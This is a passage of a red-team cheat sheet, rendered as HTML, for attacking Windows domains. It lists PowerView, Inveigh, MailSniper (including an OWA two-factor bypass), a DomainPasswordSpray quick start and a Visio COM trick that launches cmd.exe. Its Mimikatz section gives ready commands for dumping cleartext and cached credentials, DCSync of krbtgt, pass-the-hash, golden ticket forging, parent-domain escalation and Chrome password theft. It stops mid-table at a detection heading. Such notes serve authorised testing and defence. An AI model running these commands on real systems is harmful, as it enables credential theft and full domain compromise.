    <span class="nv">Find</span><span class="o">-</span><span class="nv">UserField</span>                  <span class="o">-</span>   <span class="nv">searches</span> <span class="nv">a</span> <span class="nv">user</span> <span class="nv">field</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">particular</span> <span class="nv">term</span>
    <span class="nv">Find</span><span class="o">-</span><span class="nv">ComputerField</span>              <span class="o">-</span>   <span class="nv">searches</span> <span class="nv">a</span> <span class="nv">computer</span> <span class="nv">field</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">particular</span> <span class="nv">term</span>
    <span class="nv">Get</span><span class="o">-</span><span class="nv">ExploitableSystem</span>           <span class="o">-</span>   <span class="nv">finds</span> <span class="nv">systems</span> <span class="nv">likely</span> <span class="nv">vulnerable</span> <span class="nv">to</span> <span class="nv">common</span> <span class="nv">exploits</span>
    <span class="nv">Invoke</span><span class="o">-</span><span class="nv">EnumerateLocalAdmin</span>      <span class="o">-</span>   <span class="nv">enumerates</span> <span class="nv">members</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">local</span> <span class="nv">Administrators</span> <span class="nv">groups</span> <span class="nv">across</span> <span class="nv">all</span> <span class="nv">machines</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">domain</span>
</pre></div>
</td></tr></table>

<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf">HarmJ0y PowerView Cheat Sheet PDF</a>
<a href="https://gist.github.com/HarmJ0y/3328d954607d71362e3c">HarmJ0y's PowerView 2.0 Tricks Gist</a></p>
<h4 id="inveigh">Inveigh<a class="headerlink" href="#inveigh" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<p>Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. </p>
<ul>
<li>The main Inveigh LLMNR/NBNS spoofer function.</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>
</pre></div>
</td></tr></table>

<h6 id="privilege-requirements">Privilege Requirements:<a class="headerlink" href="#privilege-requirements" title="Permanent link">&para;</a></h6>
<ul>
<li>Elevated Administrator or SYSTEM</li>
</ul>
<h6 id="features">Features:<a class="headerlink" href="#features" title="Permanent link">&para;</a></h6>
<ul>
<li>IPv4 LLMNR/NBNS spoofer with granular control     </li>
<li>NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB  </li>
<li>Basic auth cleartext credential capture over HTTP/HTTPS  </li>
<li>WPAD server capable of hosting a basic or custom wpad.dat file  </li>
<li>HTTP/HTTPS server capable of hosting limited content  </li>
<li>Granular control of console and file output  </li>
<li>Run time control  </li>
</ul>
<h4 id="powershell-wout-powershell">Powershell W/out Powershell<a class="headerlink" href="#powershell-wout-powershell" title="Permanent link">&para;</a></h4>
<ul>
<li>MsBuild.exe
<a href="https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml">https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml</a></li>
</ul>
<h4 id="get-indexeditem">Get-IndexedItem<a class="headerlink" href="#get-indexeditem" title="Permanent link">&para;</a></h4>
<p>Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents </p>
<p>Sources:
<a href="https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae">https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae</a>
<a href="https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1">https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1</a></p>
<h4 id="interacting-w-windows-api">Interacting w/ Windows API<a class="headerlink" href="#interacting-w-windows-api" title="Permanent link">&para;</a></h4>
<p><a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/">https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/</a></p>
<h5 id="example-lock-workstation-and-messagebox">Example - Lock Workstation and MessageBox<a class="headerlink" href="#example-lock-workstation-and-messagebox" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="s">@&quot;</span>
    <span class="n">using</span> <span class="n">System</span><span class="p">;</span>
    <span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">;</span>
    <span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">;</span>

    <span class="n">public</span> <span class="k">static</span> <span class="k">class</span> <span class="n">User32</span>
    <span class="p">{</span>
        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;user32.dll&quot;</span><span class="p">,</span> <span class="n">CharSet</span><span class="o">=</span><span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
            <span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">MessageBox</span><span class="p">(</span>
                <span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span>     <span class="c1">/// Parent window handle </span>
                <span class="n">String</span> <span class="n">text</span><span class="p">,</span>     <span class="c1">/// Text message to display</span>
                <span class="n">String</span> <span class="n">caption</span><span class="p">,</span>  <span class="c1">/// Window caption</span>
                <span class="kt">int</span> <span class="n">options</span><span class="p">);</span>    <span class="c1">/// MessageBox type</span>
        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;user32.dll&quot;</span><span class="p">,</span> <span class="n">CharSet</span><span class="o">=</span><span class="n">CharSet</span><span class="p">.</span><span class="n">Auto</span><span class="p">)]</span>
        <span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">LockWorkStation</span><span class="p">();</span>

    <span class="p">}</span>
    <span class="s">&quot;@</span>

    <span class="p">[</span><span class="n">USER32</span><span class="p">]</span><span class="o">::</span><span class="n">LockWorkStation</span><span class="p">()</span>
</pre></div>
</td></tr></table>

<p>List static methods
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="o">[</span><span class="n">USER32</span><span class="o">]</span><span class="w"> </span><span class="o">|</span><span class="k">get</span><span class="o">-</span><span class="k">member</span><span class="w"> </span><span class="o">-</span><span class="k">static</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h4 id="mailsniper-owa-and-exchange-enumeration">MailSniper (OWA and Exchange Enumeration)<a class="headerlink" href="#mailsniper-owa-and-exchange-enumeration" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a></p>
<p>MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.</p>
<p>MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.</p>
<p>Bypassing Dual Factor Authentication on OWA - <a href="http://www.blackhillsinfosec.com/?p=5396">http://www.blackhillsinfosec.com/?p=5396</a></p>
<ul>
<li>It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.</li>
<li>
<p>Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\EWS\Exchange.asmx</p>
<p><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">SelfSearch</span><span class="w"> </span><span class="o">-</span><span class="n">Mailbox</span><span class="w"> </span><span class="n">email</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">ExchHostname</span><span class="w"> </span><span class="n">mail</span><span class="p">.</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">Remote</span><span class="w"></span></code></p>
</li>
<li>
<p>After the credentials have been entered MailSniper will attempt to connect to the EWS URL at <a href="https://mail.domain.com/EWS/Exchange.asmx">https://mail.domain.com/EWS/Exchange.asmx</a> and search the users inbox for key terms (by default <em>pass</em>, <em>creds</em>, and <em>credentials</em>).</p>
</li>
</ul>
<h5 id="locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name">Locate OWA instances via Autodiscover using only organization primary domain name<a class="headerlink" href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">&lt;</span><span class="nt">smtp-mail-domain</span><span class="o">&gt;/</span><span class="nt">Autodiscover</span><span class="o">/</span><span class="nt">Autodiscover</span><span class="p">.</span><span class="nc">xml</span>

    <span class="nt">or</span>

    <span class="nt">autodiscover</span><span class="o">.&lt;</span><span class="nt">smtp-mail-domain</span><span class="o">&gt;/</span><span class="nt">Autodiscover</span><span class="o">/</span><span class="nt">Autodiscover</span><span class="p">.</span><span class="nc">xml</span>

    <span class="nt">or</span>

    <span class="nt">dig</span> <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.&lt;</span><span class="nt">domain-name</span><span class="o">&gt;</span> <span class="nt">SRV</span>
    <span class="o">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nt">DiG</span> <span class="nt">9</span><span class="p">.</span><span class="nc">8</span><span class="p">.</span><span class="nc">3-P1</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.&lt;</span><span class="nt">domain-name</span><span class="o">&gt;</span><span class="p">.</span><span class="nc">org</span> <span class="nt">SRV</span>
    <span class="o">;;</span> <span class="nt">global</span> <span class="nt">options</span><span class="o">:</span> <span class="o">+</span><span class="nt">cmd</span>
    <span class="o">;;</span> <span class="nt">Got</span> <span class="nt">answer</span><span class="o">:</span>
    <span class="o">;;</span> <span class="nt">-</span><span class="o">&gt;&gt;</span><span class="nt">HEADER</span><span class="o">&lt;&lt;</span><span class="nt">-</span> <span class="nt">opcode</span><span class="o">:</span> <span class="nt">QUERY</span><span class="o">,</span> <span class="nt">status</span><span class="o">:</span> <span class="nt">NOERROR</span><span class="o">,</span> <span class="nt">id</span><span class="o">:</span> <span class="nt">45003</span>
    <span class="o">;;</span> <span class="nt">flags</span><span class="o">:</span> <span class="nt">qr</span> <span class="nt">rd</span> <span class="nt">ra</span><span class="o">;</span> <span class="nt">QUERY</span><span class="o">:</span> <span class="nt">1</span><span class="o">,</span> <span class="nt">ANSWER</span><span class="o">:</span> <span class="nt">1</span><span class="o">,</span> <span class="nt">AUTHORITY</span><span class="o">:</span> <span class="nt">0</span><span class="o">,</span> <span class="nt">ADDITIONAL</span><span class="o">:</span> <span class="nt">0</span>

    <span class="o">;;</span> <span class="nt">QUESTION</span> <span class="nt">SECTION</span><span class="o">:</span>
    <span class="o">;</span><span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.&lt;</span><span class="nt">domain-name</span><span class="o">&gt;</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span>  <span class="nt">IN</span>  <span class="nt">SRV</span>

    <span class="o">;;</span> <span class="nt">ANSWER</span> <span class="nt">SECTION</span><span class="o">:</span>
    <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.&lt;</span><span class="nt">domain-name</span><span class="o">&gt;</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span> <span class="nt">1720</span> <span class="nt">IN</span>   <span class="nt">SRV</span> <span class="nt">0</span> <span class="nt">0</span> <span class="nt">443</span> <span class="nt">webmail</span><span class="o">.&lt;</span><span class="nt">domain-name</span><span class="o">&gt;</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span>

    <span class="o">;;</span> <span class="nt">Query</span> <span class="nt">time</span><span class="o">:</span> <span class="nt">2</span> <span class="nt">msec</span>
    <span class="o">;;</span> <span class="nt">SERVER</span><span class="o">:</span> <span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">178</span><span class="p">.</span><span class="nc">1</span><span class="p">#</span><span class="nn">53</span><span class="o">(</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">178</span><span class="p">.</span><span class="nc">1</span><span class="o">)</span>
    <span class="o">;;</span> <span class="nt">WHEN</span><span class="o">:</span> <span class="nt">Thu</span> <span class="nt">Dec</span>  <span class="nt">1</span> <span class="nt">10</span><span class="p">:</span><span class="nd">40</span><span class="p">:</span><span class="nd">33</span> <span class="nt">2016</span>
    <span class="o">;;</span> <span class="nt">MSG</span> <span class="nt">SIZE</span>  <span class="nt">rcvd</span><span class="o">:</span> <span class="nt">83</span>
</pre></div>
</td></tr></table>

<h4 id="domainpasswordspray-internal-windows-domain-password-brute-forcing">DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)<a class="headerlink" href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<p>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p>
<h5 id="quick-start-guide">Quick Start Guide<a class="headerlink" href="#quick-start-guide" title="Permanent link">&para;</a></h5>
<p>Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Type</span> <span class="s1">&#39;Import-Module Invoke-DomainPasswordSpray.ps1&#39;</span><span class="p">.</span>
</pre></div>
</td></tr></table></p>
<p>The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.</p>
<p>The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">PowerShell</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">DomainPasswordSpray</span> <span class="o">-</span><span class="n">Password</span> <span class="n">Winter2016</span>
</pre></div>
</td></tr></table></p>
<p>The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">PowerShell</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">DomainPasswordSpray</span> <span class="o">-</span><span class="n">UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="k">Domain</span> <span class="k">domain</span><span class="o">-</span><span class="n">name</span> <span class="o">-</span><span class="n">PasswordList</span> <span class="n">passlist</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">OutFile</span> <span class="n">sprayed</span><span class="o">-</span><span class="n">creds</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<h5 id="invoke-domainpasswordspray-options">Invoke-DomainPasswordSpray Options<a class="headerlink" href="#invoke-domainpasswordspray-options" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">UserList</span>          <span class="o">-</span> <span class="nv">Optional</span> <span class="nv">UserList</span> <span class="nv">parameter</span>. <span class="nv">This</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">generated</span> <span class="nv">automatically</span> <span class="k">if</span> <span class="nv">not</span> <span class="nv">specified</span>.
    <span class="nv">Password</span>          <span class="o">-</span> <span class="nv">A</span> <span class="nv">single</span> <span class="nv">password</span> <span class="nv">that</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">used</span> <span class="nv">to</span> <span class="nv">perform</span> <span class="nv">the</span> <span class="nv">password</span> <span class="nv">spray</span>.
    <span class="nv">PasswordList</span>      <span class="o">-</span> <span class="nv">A</span> <span class="nv">list</span> <span class="nv">of</span> <span class="nv">passwords</span> <span class="nv">one</span> <span class="nv">per</span> <span class="nv">line</span> <span class="nv">to</span> <span class="nv">use</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">password</span> <span class="nv">spray</span> <span class="ss">(</span><span class="nv">Be</span> <span class="nv">very</span> <span class="nv">careful</span> <span class="nv">not</span> <span class="nv">to</span> <span class="nv">lockout</span> <span class="nv">accounts</span><span class="ss">)</span>.
    <span class="nv">OutFile</span>           <span class="o">-</span> <span class="nv">A</span> <span class="nv">file</span> <span class="nv">to</span> <span class="nv">output</span> <span class="nv">the</span> <span class="nv">results</span> <span class="nv">to</span>.
    <span class="nv">Domain</span>            <span class="o">-</span> <span class="nv">A</span> <span class="nv">domain</span> <span class="nv">to</span> <span class="nv">spray</span> <span class="nv">against</span>.
</pre></div>
</td></tr></table>

<h4 id="misc-powershell-pasties">Misc Powershell Pasties<a class="headerlink" href="#misc-powershell-pasties" title="Permanent link">&para;</a></h4>
<p>List Removeable Drives
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="n">Win32_LogicalDisk</span> <span class="o">|</span> <span class="k">Where</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">DriveType</span> <span class="o">-</span><span class="n">eq</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span><span class="k">and</span> <span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">DeviceID</span> <span class="o">-</span><span class="n">ne</span> <span class="s1">&#39;A:&#39;</span><span class="p">)</span><span class="err">}</span> <span class="o">|</span> <span class="o">%</span><span class="err">{</span><span class="ss">&quot;USB_PROCESS_DETECTED: &quot;</span> <span class="o">+</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">ProviderName</span>  <span class="o">+</span> <span class="ss">&quot;`n&quot;</span><span class="err">}</span>
</pre></div>
</td></tr></table></p>
<p>Random Execution Method
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$<span class="nv">visio</span> <span class="o">=</span> [<span class="nv">activator</span>]::<span class="nv">CreateInstance</span><span class="ss">(</span>[<span class="nv">type</span>]::<span class="nv">GetTypeFromProgID</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">visio.application</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">system1</span><span class="s2">&quot;</span><span class="ss">))</span>
<span class="mh">$d</span><span class="nv">ocs</span> <span class="o">=</span> $<span class="nv">visio</span>.<span class="nv">Documents</span>.<span class="nv">Add</span><span class="ss">(</span><span class="s2">&quot;&quot;</span><span class="ss">)</span>
<span class="mh">$d</span><span class="nv">ocs</span>.<span class="nv">ExecuteLine</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">CreateObject(&quot;Wscript.Shell&quot;).Exec(&quot;cmd.exe&quot;)</span><span class="s1">&#39;</span><span class="ss">)</span>
</pre></div>
</td></tr></table></p>
<h3 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a>
<a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></p>
<p>Dump Cleartext Credentials
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sekurlsa</span><span class="p">::</span><span class="n">wdigest</span>
    <span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>
    <span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
</pre></div>
</td></tr></table></p>
<p>Dump cached domain credentials
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">lsadump</span><span class="p">::</span><span class="k">cache</span>
</pre></div>
</td></tr></table></p>
<p>Format mscachev2 as <code class="codehilite"><span class="err">$</span><span class="n">DCC2$10240</span><span class="o">#</span><span class="n">username</span><span class="o">#</span><span class="n">hash</span></code>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">cat</span> <span class="s1">&#39;mscachecreds.txt&#39;</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">F</span> <span class="err"></span><span class="p">:</span><span class="err"></span> <span class="err">{</span><span class="s1">&#39;print &quot;$DCC2$10240#&quot;$1&quot;#&quot;$2&#39;</span><span class="err">}</span>
</pre></div>
</td></tr></table></p>
<p>Crack mscachev2 format with Hashcat (extremely slow)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">2100</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">mscachev2</span><span class="p">.</span><span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">wordlists</span><span class="cm">/* -r rules/dive.rule</span>
</pre></div>
</td></tr></table></p>
<p>DCSYNC - Remote Hash Dumping from a Domain Controller
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="k">domain</span><span class="err">\</span><span class="n">krbtgt</span>
</pre></div>
</td></tr></table></p>
<ul>
<li>There is also a CS built-in function for this</li>
<li>Source: <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a></li>
</ul>
<p>Pass the Hash
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">localadmin</span> <span class="o">/</span><span class="k">domain</span><span class="p">:.</span> <span class="o">/</span><span class="n">ntlm</span><span class="p">:</span><span class="mi">21306681</span><span class="n">c738c3ed2d615e29be1574a3</span> <span class="o">/</span><span class="n">run</span><span class="p">:</span><span class="n">powershell</span> <span class="o">-</span><span class="n">w</span> <span class="n">hidden</span>
</pre></div>
</td></tr></table></p>
<p>Golden Ticket Creation (File)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">newadmin</span> <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span> <span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3683589091</span><span class="o">-</span><span class="mi">3492174527</span><span class="o">-</span><span class="mi">1688384936</span> <span class="o">/</span><span class="n">groups</span><span class="p">:</span><span class="mi">501</span><span class="p">,</span><span class="mi">502</span><span class="p">,</span><span class="mi">513</span><span class="p">,</span><span class="mi">512</span><span class="p">,</span><span class="mi">520</span><span class="p">,</span><span class="mi">518</span><span class="p">,</span><span class="mi">519</span> <span class="o">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="o">&lt;</span><span class="n">krbtgthash</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">newadmin</span><span class="p">.</span><span class="n">tkt</span>
</pre></div>
</td></tr></table></p>
<p>Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">newadmin</span> <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span> <span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3683589091</span><span class="o">-</span><span class="mi">3492174527</span><span class="o">-</span><span class="mi">1688384936</span> <span class="o">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="o">&lt;</span><span class="n">krbtgthash</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">ptt</span>
</pre></div>
</td></tr></table></p>
<p>To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">ChildDomainControllerMachineName$</span>
    <span class="o">/</span><span class="n">rc4</span><span class="p">:</span> <span class="n">KRBTGT</span> <span class="n">Hash</span>
    <span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">Child</span> <span class="k">Domain</span> <span class="n">SID</span>
    <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="n">FQDN</span> <span class="k">of</span> <span class="n">Child</span> <span class="k">Domain</span>
    <span class="o">/</span><span class="n">groups</span><span class="p">:</span><span class="mi">516</span> 
    <span class="o">/</span><span class="n">sids</span><span class="p">:</span><span class="n">ParentSID</span><span class="o">-</span><span class="mi">516</span><span class="p">,</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">9</span> 
    <span class="o">/</span><span class="n">id</span><span class="p">:</span><span class="n">ID</span> <span class="k">of</span> <span class="n">Child</span> <span class="k">Domain</span> <span class="n">Controller</span> 
    <span class="o">/</span><span class="n">ptt</span>
</pre></div>
</td></tr></table></p>
<p>Dump Google Chrome passwords
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">shell</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="ss">&quot;C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data&quot;</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">users</span><span class="err">\</span><span class="k">public</span><span class="err">\</span><span class="n">libraries</span><span class="err">\</span><span class="n">ld</span><span class="p">.</span><span class="n">dat</span><span class="w"></span>

<span class="w">    </span><span class="n">steal_token</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">pid</span><span class="o">&gt;</span><span class="w"></span>

<span class="w">    </span><span class="n">mimikatz</span><span class="w"> </span><span class="nv">@dpapi</span><span class="o">::</span><span class="n">chrome</span><span class="w"> </span><span class="o">/</span><span class="ow">in</span><span class="err">:</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">users</span><span class="err">\</span><span class="k">public</span><span class="err">\</span><span class="n">libraries</span><span class="err">\</span><span class="n">ld</span><span class="p">.</span><span class="n">dat</span><span class="w"> </span><span class="o">/</span><span class="n">unprotect</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Detecting Golden Ticket use on a DC
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
